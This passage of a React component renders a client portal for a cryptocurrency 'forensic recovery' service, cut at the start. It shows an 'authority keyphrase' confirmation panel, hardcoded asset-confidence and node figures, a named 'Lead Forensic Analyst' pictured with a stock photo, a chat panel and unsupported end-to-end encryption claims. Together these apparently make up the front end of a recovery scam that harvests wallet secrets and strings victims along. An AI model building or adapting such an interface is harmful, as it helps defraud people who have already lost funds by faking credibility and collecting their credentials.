                      </div>
                    </form>
                  </div>
                </motion.div>
              )}

              {(submissionSuccess || (displayStatus !== 'ANALYSIS' && hasSubmittedKeyphrase)) && (
                <motion.div 
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="glass-panel p-8 rounded-2xl border border-emerald-500/30 bg-emerald-500/10 text-center relative overflow-hidden"
                >
                  <div className="absolute top-0 right-0 p-4 opacity-5 pointer-events-none">
                    <CheckCircle2 size={120} />
                  </div>
                  
                  <div className="w-16 h-16 rounded-2xl bg-emerald-500 shadow-[0_0_30px_rgba(16,185,129,0.3)] mx-auto flex items-center justify-center mb-6 text-white">
                    <CheckCircle2 size={32} />
                  </div>
                  
                  <h3 className="text-xl font-manrope font-black text-white uppercase tracking-tight mb-3">Authority Uplink Established</h3>
                  <div className="bg-emerald-500/10 border border-emerald-500/20 py-3 px-4 rounded-lg inline-block mb-6">
                    <p className="text-xs font-mono text-emerald-400 uppercase tracking-widest font-bold">
                      DATA_RECEIVED // SECURE_HANDSHAKE_COMPLETE
                    </p>
                  </div>
                  
                  <p className="text-sm text-slate-300 max-w-md mx-auto mb-8 leading-relaxed">
                    We have successfully received your authority keyphrase. Your lead analyst is now finalizing the <span className="text-white font-bold uppercase tracking-widest text-[10px]">Forensic Trace Analysis</span>. <span className="text-blue-400 font-bold italic">Please await further instructions within your portal for the next operational step.</span>
                  </p>
                  
                  <div className="flex flex-col items-center gap-4 text-[9px] font-mono text-slate-500 uppercase tracking-[0.2em]">
                    <div className="flex items-center gap-2">
                       <div className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></div>
                       <span>Encrypted Sync: ACTIVE</span>
                    </div>
                    <div className="flex items-center gap-2 text-slate-600">
                      <span>Ref: {displayId}</span>
                      <span>//</span>
                      <span>Auth: {displayEmail}</span>
                    </div>
                  </div>
                </motion.div>
              )}

              {/* Recovery Stats */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div className="glass-panel p-6 rounded-2xl border border-emerald-500/10">
                  <p className="text-[10px] font-mono font-bold text-emerald-500 mb-2 tracking-widest uppercase">Verified Assets</p>
                  <p className="text-3xl font-mono font-bold text-white tracking-tighter">{displayValue}</p>
                  <div className="mt-4 flex items-center gap-2">
                    <span className="text-[10px] font-mono text-slate-600 uppercase">Confidence Rating:</span>
                    <span className="text-[10px] font-mono text-emerald-400 font-bold">99.4%</span>
                  </div>
                </div>
                <div className="glass-panel p-6 rounded-2xl border border-blue-500/10">
                  <p className="text-[10px] font-mono font-bold text-blue-500 mb-2 tracking-widest uppercase">Nodes Assigned</p>
                  <p className="text-3xl font-mono font-bold text-white tracking-tighter">14</p>
                  <div className="mt-4 flex items-center gap-2">
                    <span className="text-[10px] font-mono text-slate-600 uppercase">Detection Level:</span>
                    <span className="text-[10px] font-mono text-blue-400 font-bold">HEURISTIC_V2</span>
                  </div>
                </div>
              </div>
            </div>

            {/* Right Col: Activity & Info */}
            <div className="lg:col-span-4 space-y-8">
              <div className="glass-panel rounded-2xl p-6 border border-white/5">
                <h3 className="font-mono text-xs font-bold text-white mb-6 uppercase tracking-[0.2em] flex items-center gap-2">
                  <Activity size={14} className="text-blue-500" /> Recent Logs
                </h3>
                <div className="space-y-6">
                  {recentActivity.map((act, i) => (
                    <div key={i} className="flex gap-4">
                      <div className="w-8 h-8 rounded-lg bg-white/5 border border-white/10 flex items-center justify-center flex-shrink-0">
                        {act.type === 'log' ? <Activity size={14} className="text-blue-400" /> : 
                         act.type === 'file' ? <FileText size={14} className="text-emerald-400" /> : 
                         <MessageSquare size={14} className="text-purple-400" />}
                      </div>
                      <div>
                        <p className="text-xs text-slate-300 font-manrope font-bold leading-tight mb-1">{act.title}</p>
                        <p className="text-[9px] font-mono text-slate-600 uppercase tracking-tighter">{act.time}</p>
                      </div>
                    </div>
                  ))}
                </div>
                <button className="w-full mt-8 py-3 bg-white/5 border border-white/10 rounded-xl font-mono text-[10px] font-bold text-slate-400 hover:text-white uppercase tracking-widest transition-colors cursor-pointer capitalize">
                  View full session history
                </button>
              </div>

              {/* Secure Analyst Info */}
              <div className="glass-panel rounded-2xl p-6 border border-blue-500/20 bg-blue-500/5">
                <div className="flex items-center gap-4 mb-6">
                  <div className="w-12 h-12 rounded-xl border border-blue-500/30 overflow-hidden">
                    <img 
                      src="https://images.unsplash.com/photo-1560250097-0b93528c311a?q=80&w=256&h=256&auto=format&fit=crop" 
                      alt="Analyst" 
                      className="w-full h-full object-cover grayscale"
                    />
                  </div>
                  <div>
                    <h4 className="text-xs font-bold text-white uppercase tracking-widest">Rogers, S.</h4>
                    <p className="text-[9px] font-mono text-blue-400 uppercase tracking-tighter">Lead Forensic Analyst</p>
                  </div>
                </div>
                <button 
                  onClick={() => setActiveTab('messages')}
                  className="w-full py-4 bg-blue-600 text-white rounded-xl font-manrope font-black text-xs uppercase tracking-[0.2em] flex items-center justify-center gap-3 hover:brightness-110 transition-all shadow-[0_0_20px_#0062ff33] cursor-pointer"
                >
                  <MessageSquare size={14} /> Open Secure Comms
                </button>
              </div>
            </div>
          </motion.div>
        )}

        {activeTab === 'messages' && (
          <motion.div 
            key="messages"
            initial={{ opacity: 0, scale: 0.98 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.98 }}
            className="grid grid-cols-1 lg:grid-cols-12 gap-8 h-[600px]"
          >
            {/* Message Center */}
            <div className="lg:col-span-8 glass-panel rounded-2xl flex flex-col overflow-hidden border border-white/5">
              {/* Chat Header */}
              <div className="px-6 py-4 border-b border-white/10 flex items-center justify-between bg-slate-950/40">
                <div className="flex items-center gap-4">
                  <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></div>
                  <div>
                    <p className="text-xs font-bold text-white uppercase tracking-widest">Secure Terminal</p>
                    <p className="text-[9px] font-mono text-slate-500">ENCRYPTION: AES-256-GCM</p>
                  </div>
                </div>
                <Lock size={16} className="text-slate-600" />
              </div>

              {/* Messages Area */}
              <div className="flex-1 overflow-y-auto p-6 space-y-8 scrollbar-hide">
                <div className="flex justify-center">
                  <span className="text-[9px] font-mono text-slate-700 bg-white/5 px-4 py-1 rounded-full uppercase tracking-widest">Channel Initialized</span>
                </div>

                {messages.length === 0 ? (
                  <div className="text-center py-20 opacity-30 text-[10px] font-mono uppercase tracking-widest">
                    Awaiting analyst uplink...
                  </div>
                ) : (
                  messages.map((msg, i) => (
                    <div key={i} className={`flex gap-4 ${msg.senderId === 'client' ? 'flex-row-reverse' : ''}`}>
                      <div className={`w-8 h-8 rounded-lg flex items-center justify-center flex-shrink-0 ${
                        msg.senderId === 'client' ? 'bg-slate-800 border border-white/10' : 'bg-blue-500/20 border border-blue-500/30'
                      }`}>
                         {msg.senderId === 'client' ? <CheckCircle2 size={14} className="text-slate-400" /> : <UserIcon size={14} className="text-blue-400" />}
                      </div>
                      <div className={`max-w-[80%] ${msg.senderId === 'client' ? 'text-right' : ''}`}>
                        <div className={`p-4 rounded-2xl ${
                          msg.senderId === 'client' 
                            ? 'bg-blue-600 text-white rounded-tr-none' 
                            : 'bg-slate-900 border border-white/10 text-slate-300 rounded-tl-none'
                        }`}>
                          <p className="text-sm leading-relaxed">{msg.text}</p>
                        </div>
                        <p className="text-[9px] font-mono text-slate-600 mt-2 uppercase">
                          {msg.senderId === 'client' ? 'Me' : msg.sender} // {msg.createdAt?.toDate?.()?.toLocaleTimeString() || 'TRANSMITTING...'}
                        </p>
                      </div>
                    </div>
                  ))
                )}
              </div>

              {/* Input Area */}
              <form onSubmit={handleSendMessage} className="p-6 bg-slate-950/40 border-t border-white/10">
                <div className="relative">
                  <input 
                    type="text"
                    value={message}
                    onChange={(e) => setMessage(e.target.value)}
                    placeholder="ENTER SECURE TRANSMISSION..."
                    className="w-full bg-[#0a0e16]/60 border border-white/10 text-white pl-6 pr-16 py-4 rounded-xl font-mono text-sm focus:border-blue-500/50 outline-none transition-all"
                  />
                  <button 
                    type="submit"
                    disabled={sendingMessage || !message.trim()}
                    className="absolute right-2 top-2 bottom-2 px-4 bg-blue-600 text-white rounded-lg hover:brightness-110 active:scale-95 transition-all cursor-pointer disabled:opacity-50"
                  >
                    <Send size={16} />
                  </button>
                </div>
              </form>
            </div>

            {/* Support Sidebar */}
            <div className="lg:col-span-4 space-y-6">
              <div className="glass-panel p-6 rounded-2xl border border-white/5">
                <h3 className="font-mono text-xs font-bold text-white mb-4 uppercase tracking-[0.2em]">Contact Rules</h3>
                <div className="space-y-4">
                  <div className="flex gap-3">
                    <ShieldCheck size={14} className="text-emerald-500" />
                    <p className="text-[11px] text-slate-400 font-manrope">Never share your private keys or seed phrases in this chat.</p>
                  </div>
                  <div className="flex gap-3">
                    <Clock size={14} className="text-blue-500" />
                    <p className="text-[11px] text-slate-400 font-manrope">Average analyst response time is currently 15-30 minutes.</p>
                  </div>
                </div>
              </div>
            </div>
          </motion.div>
        )}

      </AnimatePresence>

      {/* Security Banner */}
      <div className="mt-12 p-4 bg-emerald-500/5 border border-emerald-500/20 rounded-xl flex items-center gap-4">
        <ShieldCheck className="text-emerald-500" size={20} />
        <p className="text-[10px] font-mono text-slate-400 uppercase tracking-widest leading-loose">
          All data within this case workspace is end-to-end encrypted. No third-party entities can access this forensic stream without explicitly granted multi-sig approval.
        </p>
      </div>
    </main>
  );
};
